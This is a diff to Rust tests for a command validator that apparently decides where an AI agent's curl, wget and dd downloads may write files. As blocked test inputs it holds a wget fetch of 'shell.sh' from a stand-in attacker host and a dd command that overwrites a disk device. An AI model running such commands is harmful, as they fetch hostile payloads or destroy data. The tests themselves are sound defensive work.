@@ -242,10 +242,17 @@ fn validate_allows_curl_to_stdout() {
 }
 
 #[test]
-fn validate_blocks_wget_default_file_download() {
+fn validate_judges_wget_by_where_it_writes() {
+    // No cwd: the default target (the current directory) cannot be placed.
     assert!(validate_command("wget http://attacker.com/shell.sh").is_some());
     assert!(validate_command("wget -q https://example.com/file.tar.gz").is_some());
-    assert!(validate_command("wget -O /tmp/out https://example.com").is_some());
+    assert!(validate_command("wget -O /etc/out https://example.com").is_some());
+    assert!(validate_command("wget -P /etc https://example.com/a").is_some());
+    assert!(validate_command("wget -qO- -o /etc/log https://example.com").is_some());
+    // A scratch destination passes, like `>` capture there.
+    assert!(validate_command("wget -O /tmp/out https://example.com").is_none());
+    assert!(validate_command("wget -qO/tmp/out https://example.com").is_none());
+    assert!(validate_command("wget --directory-prefix=/tmp/d https://e.com/a").is_none());
 }
 
 #[test]
@@ -259,8 +266,9 @@ fn validate_allows_wget_stdout_and_spider() {
 
 #[test]
 fn validate_blocks_dd_output_file() {
-    assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_some());
+    assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_none());
     assert!(validate_command("dd if=image.iso of=/dev/sda").is_some());
+    assert!(validate_command("dd if=/dev/zero of=/etc/fill").is_some());
 }
 
 #[test]
@@ -679,10 +687,17 @@ fn a_relative_download_into_a_scratch_directory_is_allowed() {
     }
 }
 
-/// The #391 boundary is untouched: a relative target outside a scratch
-/// directory — or one this cannot resolve — is still a file write.
+/// Without capture roots only scratch passes: a relative target outside it —
+/// or one this cannot resolve — is still refused. wget and dd follow the same
+/// rule as curl.
 #[test]
-fn a_download_into_the_project_is_still_blocked() {
+fn a_download_outside_every_capture_root_is_blocked() {
+    for cmd in [
+        "cd /tmp && wget -O page.html https://e/x",
+        "cd /tmp && dd if=/dev/zero of=block.bin bs=1 count=1",
+    ] {
+        assert!(download_to_file_reason(cmd).is_none(), "{cmd}");
+    }
     for cmd in [
         "curl -sL -o shot.png https://example.com/a.png",
         "cd /Users/me/project && curl -sL -o shot.png https://e/x",
@@ -690,10 +705,6 @@ fn a_download_into_the_project_is_still_blocked() {
         "cd /tmp && curl -sL -o /Users/me/project/shot.png https://e/x",
         "wget https://example.com/a.tar.gz",
         "dd if=/dev/zero of=/Users/me/project/block.bin",
-        // wget/dd keep no scratch carve-out at all — a documented,
-        // separately tested decision this fix deliberately leaves alone.
-        "cd /tmp && wget -O page.html https://e/x",
-        "cd /tmp && dd if=/dev/zero of=block.bin bs=1 count=1",
     ] {
         assert!(
             download_to_file_reason(cmd).is_some(),
@@ -738,29 +749,82 @@ fn a_download_target_through_a_literal_variable_is_judged_where_it_lands() {
     }
     let msg = validate_command("curl -sL -o $UNSET/shot.png https://e/x").expect("blocked");
     assert!(
-        msg.contains("a variable this same command set to a literal scratch path"),
+        msg.contains("a variable this same command set to a literal path"),
         "the refusal must say which spellings it can resolve: {msg}"
     );
 }
 
-/// #2080: the refusal claimed parity with the `>` capture rule and that "a
-/// literal path" would do, so a caller retried with a project path and was
-/// refused again with the same text. It must state the rule it applies.
+/// #2080 follow-up (owner decision 2026-10-15): a download may write where
+/// `>` capture may. An agent fetching a model into its project was refused
+/// three times in a row — variable, literal, `&&` chain — before giving up;
+/// scratch-then-`mv` was the only route. The reporter's forms now pass.
 #[test]
-fn the_download_refusal_states_the_scratch_only_rule() {
-    for cmd in [
-        "curl -s -o lcx-probe-d.txt https://example.com",
-        "curl -s -o /repo/lcx-probe-h.txt https://example.com",
+fn a_download_writes_where_output_capture_may() {
+    // An absolute root on every platform: `/Users/…` is not absolute on Windows.
+    let home = if cfg!(windows) {
+        "C:/Users/me"
+    } else {
+        "/Users/me"
+    };
+    let project = format!("{home}/promo/tts");
+    let other = format!("{home}/other");
+    let roots = vec![project.clone()];
+    let check = |cmd: &str, cwd: Option<&str>| validate_command_in_cwd(cmd, &roots, None, cwd);
+    for (cmd, cwd) in [
+        (
+            format!("D={project}; B=https://h/x; curl -sL -o $D/model/m.onnx $B/m.onnx"),
+            None,
+        ),
+        (
+            format!("curl -sL -o {project}/model/v.npz https://h/v.npz"),
+            None,
+        ),
+        (
+            "curl -sL -o model/m.onnx https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "cd model && curl -sLO https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "wget -P model https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "dd if=/dev/zero of=model/blank.bin bs=1 count=1".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o /tmp/shot.png https://e/x".to_string(),
+            Some(project.as_str()),
+        ),
     ] {
-        let msg = validate_command(cmd).expect("a project download stays refused");
+        assert!(check(&cmd, cwd).is_none(), "{cmd}: {:?}", check(&cmd, cwd));
+    }
+    for (cmd, cwd) in [
+        (
+            format!("curl -sL -o {other}/m.onnx https://h/m.onnx"),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o ../../other/m.onnx https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o $UNSET/m.onnx https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o model/m.onnx https://h/m.onnx".to_string(),
+            None,
+        ),
+        ("wget https://h/m.onnx".to_string(), Some(other.as_str())),
+    ] {
+        let msg = check(&cmd, cwd).unwrap_or_else(|| panic!("must stay refused: {cmd}"));
         assert!(
-            msg.contains("may only write into a scratch path")
-                && msg.contains("not into the project"),
-            "{msg}"
-        );
-        assert!(
-            !msg.contains("capture rule applies") && !msg.contains("literal path"),
-            "no wording that promises a spelling which cannot pass: {msg}"
+            msg.contains("may write where output capture may") && msg.contains("project"),
+            "the refusal states the rule it applies: {msg}"
         );
     }
 }
